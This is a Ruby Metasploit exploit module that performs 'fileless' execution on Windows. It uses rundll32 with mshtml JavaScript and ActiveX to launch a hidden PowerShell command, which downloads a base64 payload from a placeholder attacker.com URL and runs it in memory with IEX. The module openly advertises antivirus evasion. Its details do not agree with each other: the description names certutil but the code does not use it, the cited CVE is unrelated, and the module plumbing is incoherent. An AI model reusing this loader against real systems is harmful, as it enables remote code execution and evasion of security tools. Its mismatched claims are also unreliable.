require 'msf/core/modules/external/bridge'
require 'msf/core/module/external'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Module::External
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      Name:           'Fileless LOLBAS Exploit (certutil + rundll32 ActiveX)',
      Description:    %q{
        Pure fileless execution leveraging LOLBAS utilities:
        - Uses certutil to download a base64-encoded payload
        - Powershell decodes and runs the payload in-memory
        - rundll32 with mshtml + ActiveXObject is used to trigger execution
        No files are ever written to disk. Ideal for AV evasion and living-off-the-land post-exploitation.
      },
      Author:         [ 'Q (AP3X)' ],
      License:        MSF_LICENSE,
      Platform:       [ 'windows' ],
      Arch:           [ ARCH_X86, ARCH_X64 ],
      Privileged:     false,
      Targets:        [ [ 'Windows x86/x64', {} ] ],
      DefaultTarget:  0,
      DisclosureDate: 'Apr 16 2025',
      References:     [
        ['URL', 'https://lolbas-project.github.io'],
        ['CVE', '2021-34527']
      ]
    ))

    register_options(
      [
        OptString.new('DROP_URL', [true, 'URL to base64-encoded PowerShell dropper (UTF-16LE)', 'http://attacker.com/encoded_dropper.txt'])
      ]
    )
  end

  def execute_command(cmd, opts)
    execute_module('external', args: datastore.merge(command: cmd))
  end

  def exploit
    print_status("Starting advanced fileless payload execution...")

    encoded_url = datastore['DROP_URL']

    # The PowerShell one-liner to:
    # 1. Download base64 content using certutil
    # 2. Decode base64 string directly in memory
    # 3. Execute it without writing to disk
    ps_payload = %Q{
      $b64 = (Invoke-WebRequest -Uri '#{encoded_url}').Content;
      $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64));
      IEX $decoded
    }.strip.gsub('"', '\"').gsub("\n", '')

    # Rundll32 + JavaScript + ActiveX to execute the in-memory dropper
    rundll32_launcher = %Q{rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -Command \\\"#{ps_payload}\\\"')")}

    print_status("Executing fileless payload with rundll32: #{rundll32_launcher}")
    execute_cmdstager({ flavor: :psh_invoke, command: rundll32_launcher })
  end
end

